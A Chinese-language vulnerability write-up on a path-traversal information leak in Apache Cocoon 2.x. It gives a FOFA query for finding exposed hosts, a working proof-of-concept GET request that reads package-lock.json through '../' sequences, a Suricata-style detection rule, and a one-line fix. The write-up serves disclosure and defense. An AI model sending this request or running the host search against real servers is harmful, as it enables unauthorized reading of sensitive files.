# Apache_Cocoon-信息泄露

Apache_Cocoon-信息泄露，攻击者可进行读取系统内任意敏感信息。

# 影响版本

Apache Cocoon 2.x

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="apache-cocoon"

POC/EXP：

```
GET /xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json HTTP/1.1
Host:127.0.0.1
```

![image-20260922093343521](assets/image-20260922093343521.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"Apache Cocoon - /xmlui/themes/Mirage2 路径穿越读取 package-lock.json 信息泄露";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/xmlui/themes/Mirage2/";
        fast_pattern;
    http.uri;
        content:"..%2F"; nocase;
    http.uri;
        content:"package-lock.json"; nocase;
    metadata:
        service http,
        affected_product "Apache Cocoon",
        vulnerability_type "Path Traversal / Sensitive File Disclosure",
        severity "medium";
    classtype:sensitive-information-leak;
    sid:1000745;
    rev:1;
    priority:2;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
